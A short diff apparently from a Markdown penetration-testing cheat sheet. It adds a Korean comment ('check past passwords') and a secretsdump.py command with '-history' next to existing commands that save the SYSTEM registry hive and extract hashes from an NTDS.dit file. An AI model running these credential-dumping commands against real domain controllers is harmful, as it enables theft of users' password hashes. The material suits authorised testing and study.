@@ -620,6 +620,9 @@ reg save HKLM\SYSTEM SYSTEM
 ```
 ```bash
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
+# 과거 비밀번호 확인
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -history
 ```
  
 </details>
